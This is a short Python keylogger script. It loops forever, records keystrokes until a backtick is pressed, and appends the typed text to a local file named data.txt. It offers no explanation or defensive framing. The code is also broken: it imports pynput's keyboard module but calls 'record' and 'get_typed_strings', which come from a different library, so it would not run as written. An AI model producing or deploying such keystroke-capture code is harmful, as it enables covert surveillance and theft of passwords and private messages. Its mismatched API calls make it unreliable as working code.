from pynput import keyboard

path = "data.txt"

while True:
    with open(path, 'a') as data_file:

        events = keyboard.record('`')
        typed = list(keyboard.get_typed_strings(events))

        data_file.write('\n')
        data_file.write(typed[0])